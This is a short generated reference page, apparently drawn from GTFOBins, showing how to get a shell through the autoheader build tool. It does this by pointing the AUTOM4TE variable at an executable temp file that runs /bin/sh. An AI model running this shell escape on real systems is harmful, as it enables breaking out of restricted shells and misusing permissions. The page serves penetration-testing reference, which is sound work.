---
parsed_by: focuslocust
source: commands
type: generated
---
# autoheader Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## autoheader

Tool page: [autoheader](../../tools/linux/autoheader.md)

### shell

```text
echo '/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoheader
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/autoheader` |
| Evidence | Function example preserved from source parser. |
